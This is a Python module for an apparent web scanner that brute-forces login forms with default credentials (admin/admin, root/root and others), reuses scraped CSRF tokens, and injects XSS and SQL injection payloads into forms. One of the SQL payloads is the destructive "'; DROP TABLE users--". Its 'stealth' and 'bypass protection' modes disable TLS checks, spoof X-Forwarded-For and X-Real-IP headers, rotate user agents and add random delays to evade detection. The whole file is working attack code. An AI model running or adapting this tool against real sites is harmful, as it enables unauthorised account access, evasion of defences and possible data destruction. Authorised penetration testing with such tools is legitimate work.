#!/usr/bin/env python3
import requests
import random
import time
import ssl
from typing import Optional, Dict, Any, List
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import settings
from .vulnerability_base import VulnerabilityModule

class Scanner(VulnerabilityModule):
    name = "form_bruteforce"
    description = "Advanced login form detection with security bypass capabilities"
    risk = "low"
    useproxy = getattr(settings, "USEPROXY", False)
    enabled = False
    aggressive_mode = False
    bypass_protection = False
    custom_credentials = []
    
    def __init__(self, target, session=None, timeout=30, retries=2, debug=False, aggressive=False,
                 custom_credentials=None, bypass_protection=False, stealth=False, verbose=False):
        if session is None:
            session = requests.Session()
        super().__init__(target, session, timeout, retries, debug, aggressive, stealth, verbose)
        self.aggressive_mode = aggressive
        self.bypass_protection = bypass_protection
        self.custom_credentials = custom_credentials if custom_credentials else []
        self.stealth = stealth
        self.verbose = verbose
        self.timeout = timeout
        self.base_response = None
        self.base_content = None
        
        if self.bypass_protection or self.stealth:
            self.session.verify = False
            requests.packages.urllib3.disable_warnings()
            self.session.headers.update({
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
                ]),
                'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0'
            })
    
    def _get_base_response(self):
        try:
            self.base_response = self.session.get(
                self.target,
                timeout=self.timeout,
                verify=not (self.bypass_protection or self.stealth)
            )
            self.base_content = self.base_response.text
            return True
        except Exception as e:
            if self.debug:
                print(f"Base request error: {e}")
            return False
    
    def _is_login_successful(self, response, base_content):
        if response.status_code not in [200, 302, 303]:
            return False
            
        if response.text == self.base_content:
            return False
            
        success_indicators = [
            "dashboard", "welcome", "logout", "sign out", "my account",
            "profile", "settings", "admin panel", "control panel",
            "successfully logged in", "login successful", "authentication successful"
        ]
        
        failure_indicators = [
            "invalid", "incorrect", "failed", "error", "wrong", "denied",
            "not found", "unauthorized", "forbidden", "access denied",
            "login failed", "authentication failed", "invalid credentials"
        ]
        
        response_lower = response.text.lower()
        
        for indicator in failure_indicators:
            if indicator in response_lower:
                return False
                
        success_count = sum(1 for indicator in success_indicators if indicator in response_lower)
        if success_count > 0:
            return True
            
        if len(response.history) > 0 and response.url != self.target:
            return True
            
        if len(response.text) > 100 and len(self.base_content) > 100:
            shorter_len = min(len(response.text), len(self.base_content))
            overlap = 0
            for i in range(0, shorter_len - 10, 10):
                if response.text[i:i+10] in self.base_content:
                    overlap += 10
                    
            if overlap / shorter_len < 0.7:
                return True
                
        return False
    
    def _test_form_submission(self, form_data, action_url, method):
        try:
            if method.upper() == "GET":
                response = self.session.get(action_url, params=form_data, timeout=self.timeout, allow_redirects=True)
            else:
                response = self.session.post(action_url, data=form_data, timeout=self.timeout, allow_redirects=True)
                
            is_successful = self._is_login_successful(response, self.base_content) if self.base_content else False
            
            return {
                "status_code": response.status_code,
                "redirected": len(response.history) > 0,
                "final_url": response.url,
                "content_length": len(response.content),
                "response_time": response.elapsed.total_seconds(),
                "headers": dict(response.headers),
                "successful_login": is_successful
            }
        except Exception as e:
            if self.debug:
                print(f"Form test error: {e}")
            return None
    
    def _bypass_csrf_protection(self, form, soup):
        csrf_tokens = {}
        for inp in form.find_all("input"):
            name = inp.get("name", "")
            value = inp.get("value", "")
            if any(token in name.lower() for token in ["csrf", "token", "nonce", "authenticity", "security", "anticsrf"]):
                csrf_tokens[name] = value
        if not csrf_tokens:
            hidden_inputs = form.find_all("input", type="hidden")
            for inp in hidden_inputs:
                name = inp.get("name", "")
                value = inp.get("value", "")
                if name and value and len(value) > 5:
                    csrf_tokens[name] = value
        meta_tags = soup.find_all("meta")
        for meta in meta_tags:
            name = meta.get("name", "") or meta.get("property", "")
            content = meta.get("content", "")
            if any(token in name.lower() for token in ["csrf", "token", "nonce"]):
                csrf_tokens[name] = content
        return csrf_tokens
    
    def _detect_javascript_forms(self, soup, base_url):
        js_forms = []
        scripts = soup.find_all("script")
        for script in scripts:
            if script.string:
                script_content = script.string.lower()
                form_patterns = [
                    "document.createelement('form')",
                    ".appendchild(form",
                    ".innerhtml",
                    "form.submit()",
                    "form.action",
                    "form.method",
                    "form.append",
                    "new formdata",
                    "ajaxform",
                    "fetch(form",
                    "xmlhttprequest",
                    "form.serialize"
                ]
                if any(pattern in script_content for pattern in form_patterns):
                    js_forms.append({
                        "type": "javascript_dynamic",
                        "source": "inline_script",
                        "content_sample": script.string[:200] + "..." if len(script.string) > 200 else script.string
                    })
        return js_forms
    
    def _extract_form_details(self, form):
        inputs = {}
        for inp in form.find_all("input"):
            inp_type = (inp.get("type", "text") or "text").lower()
            inp_name = (inp.get("name") or "").lower()
            inp_id = (inp.get("id") or "").lower()
            inputs[f"{inp_type}_{inp_name}_{inp_id}"] = {
                "type": inp_type,
                "name": inp_name,
                "id": inp_id,
                "value": inp.get("value", "")
            }
        return inputs
    
    def _test_form_vulnerabilities(self, form, base_url, soup):
        results = []
        action = form.get("action") or ""
        method = (form.get("method") or "POST").upper()
        form_action_url = urljoin(base_url, action)
        csrf_tokens = self._bypass_csrf_protection(form, soup)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            form_data = {}
            for inp in form.find_all("input"):
                inp_name = inp.get("name")
                if inp_name:
                    inp_type = inp.get("type", "").lower()
                    if inp_type in ["text", "email", "tel", "search", "url"] or not inp_type:
                        form_data[inp_name] = payload
                    elif inp_type == "hidden":
                        form_data[inp_name] = inp.get("value", "")
                    else:
                        form_data[inp_name] = inp.get("value", "")
            form_data.update(csrf_tokens)
            
            test_result = self._test_form_submission(form_data, form_action_url, method)
            if test_result and payload in test_result.get("final_url", "") or payload in self.session.get(form_action_url, timeout=self.timeout).text:
                results.append({
                    "vulnerability": "XSS",
                    "payload": payload,
                    "result": test_result
                })
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        for payload in sqli_payloads:
            form_data = {}
            for inp in form.find_all("input"):
                inp_name = inp.get("name")
                if inp_name:
                    inp_type = inp.get("type", "").lower()
                    if inp_type in ["text", "email", "tel", "search", "url"] or not inp_type:
                        form_data[inp_name] = payload
                    elif inp_type == "hidden":
                        form_data[inp_name] = inp.get("value", "")
                    else:
                        form_data[inp_name] = inp.get("value", "")
            form_data.update(csrf_tokens)
            
            test_result = self._test_form_submission(form_data, form_action_url, method)
            if test_result and any(error in test_result.get("final_url", "").lower() for error in ["sql", "mysql", "error", "warning"]):
                results.append({
                    "vulnerability": "SQL Injection",
                    "payload": payload,
                    "result": test_result
                })
        
        return results
    
    def _aggressive_form_testing(self, form, base_url, soup):
        results = []
        action = form.get("action") or ""
        method = (form.get("method") or "POST").upper()
        form_action_url = urljoin(base_url, action)
        csrf_tokens = self._bypass_csrf_protection(form, soup)
        test_credentials = self.custom_credentials + [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
            {"username": "administrator", "password": "administrator"},
            {"username": "test", "password": "test"},
            {"username": "test", "password": "test123"},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "user"},
            {"username": "demo", "password": "demo"},
            {"username": "guest", "password": "guest"}
        ]
        for creds in test_credentials:
            form_data = {}
            username_field = None
            password_field = None
            for inp in form.find_all("input"):
                inp_name = inp.get("name")
                if inp_name:
                    inp_type = inp.get("type", "").lower()
                    if inp_type in ["text", "email", "tel"] or not inp_type:
                        if any(key in inp_name.lower() for key in ["user", "login", "email", "name", "account", "id"]):
                            username_field = inp_name
                            form_data[inp_name] = creds["username"]
                        else:
                            form_data[inp_name] = inp.get("value", "")
                    elif inp_type == "password":
                        password_field = inp_name
                        form_data[inp_name] = creds["password"]
                    elif inp_type == "hidden":
                        form_data[inp_name] = inp.get("value", "")
                    else:
                        form_data[inp_name] = inp.get("value", "")
            form_data.update(csrf_tokens)
            if self.stealth:
                time.sleep(random.uniform(0.5, 2.0))
            else:
                time.sleep(0.2)
            test_result = self._test_form_submission(form_data, form_action_url, method)
            if test_result and test_result.get("successful_login", False):
                results.append({
                    "credentials": creds,
                    "result": test_result,
                    "form_data_keys": list(form_data.keys()),
                    "username_field": username_field,
                    "password_field": password_field
                })
        return results
    
    def scan(self):
        try:
            self._get_base_response()
            
            if self.bypass_protection or self.stealth:
                self.session.headers.update({
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                    ]),
                    "Referer": self.target
                })
            try:
                r = self.session.get(self.target, timeout=self.timeout, verify=not (self.bypass_protection or self.stealth))
            except (requests.ProxyError, requests.ConnectTimeout, requests.ReadTimeout, requests.SSLError, requests.ConnectionError, OSError):
                fallback_session = requests.Session()
                fallback_session.headers.update(self.session.headers)
                r = fallback_session.get(self.target, timeout=self.timeout, verify=not (self.bypass_protection or self.stealth))
            soup = BeautifulSoup(r.text, "lxml")
            forms = soup.find_all("form")
            js_forms = self._detect_javascript_forms(soup, self.target)
            all_forms = []
            login_like = []
            aggressive_results = []
            vulnerability_results = []
            
            for form in forms:
                form_details = {
                    "method": (form.get("method") or "POST").upper(),
                    "action": form.get("action") or "",
                    "id": form.get("id", ""),
                    "name": form.get("name", ""),
                    "class": form.get("class", []),
                    "inputs": self._extract_form_details(form)
                }
                all_forms.append(form_details)
                form_identifiers = " ".join([
                    form.get("id", ""),
                    form.get("name", ""),
                    form.get("action", ""),
                    " ".join(form.get("class", [])),
                    form.get("onsubmit", "")
                ]).lower()
                has_password = any("password" in inp_key for inp_key in form_details["inputs"].keys())
                has_submit = any("submit" in inp_details["type"] for inp_details in form_details["inputs"].values())
                
                is_login_form = False
                login_keywords = ["login", "signin", "auth", "authenticate", "logon", "sign-in", "log-in"]
                if any(keyword in form_identifiers for keyword in login_keywords) or has_password:
                    is_login_form = True
                
                is_search_form = any(keyword in form_identifiers for keyword in ["search", "find", "query", "filter"])
                
                if is_login_form:
                    form_info = {
                        "method": form_details["method"],
                        "action": form_details["action"],
                        "inputs": list(form_details["inputs"].keys()),
                        "has_password": has_password,
                        "form_id": form_details["id"],
                        "form_name": form_details["name"]
                    }
                    login_like.append(form_info)
                    if (self.aggressive_mode or self.bypass_protection or self.stealth) and has_password:
                        form_tests = self._aggressive_form_testing(form, self.target, soup)
                        if form_tests:
                            aggressive_results.append({
                                "form_info": form_info,
                                "test_results": form_tests
                            })
                elif is_search_form or (self.aggressive_mode and not has_password):
                    vuln_tests = self._test_form_vulnerabilities(form, self.target, soup)
                    if vuln_tests:
                        vulnerability_results.append({
                            "form_info": {
                                "method": form_details["method"],
                                "action": form_details["action"],
                                "inputs": list(form_details["inputs"].keys()),
                                "form_id": form_details["id"],
                                "form_name": form_details["name"]
                            },
                            "vulnerabilities": vuln_tests
                        })
            
            for js_form in js_forms:
                all_forms.append(js_form)
                login_like.append({
                    "method": "JAVASCRIPT",
                    "action": "dynamic",
                    "inputs": ["javascript_generated"],
                    "has_password": True,
                    "form_type": "javascript_dynamic"
                })
            
            risk_level = "low"
            if login_like:
                risk_level = "medium"
            if aggressive_results:
                risk_level = "high"
            if vulnerability_results:
                risk_level = "high"
            
            evidence = {
                "total_forms_detected": len(all_forms),
                "html_forms": len(forms),
                "javascript_forms": len(js_forms),
                "login_forms": login_like,
                "successful_credentials": aggressive_results if (self.aggressive_mode or self.bypass_protection or self.stealth) else [],
                "vulnerabilities_found": vulnerability_results,
                "sample_forms": all_forms[:3] if all_forms else []
            }
            
            notes = f"Detected {len(all_forms)} forms ({len(forms)} HTML + {len(js_forms)} JavaScript); {len(login_like)} login-like forms"
            if self.aggressive_mode or self.bypass_protection or self.stealth:
                successful_tests = sum(len(result["test_results"]) for result in aggressive_results)
                vuln_tests = sum(len(result["vulnerabilities"]) for result in vulnerability_results)
                notes += f" | Aggressive testing: {successful_tests} successful credentials, {vuln_tests} vulnerabilities found"
            
            return {
                "ok": True,
                "risk": risk_level,
                "evidence": evidence,
                "notes": notes
            }
        except requests.RequestException as e:
            if self.debug:
                print(f"Request error: {e}")
            return {"ok": False, "risk": "low", "evidence": [], "notes": str(e)}
        except Exception as e:
            if self.debug:
                print(f"Unexpected error: {e}")
            return {"ok": False, "risk": "low", "evidence": [], "notes": f"Unexpected error: {e}"}
    
    def run(self, **kwargs):
        for key, value in kwargs.items():
            if hasattr(self, key):
                setattr(self, key, value)
        return self.scan()
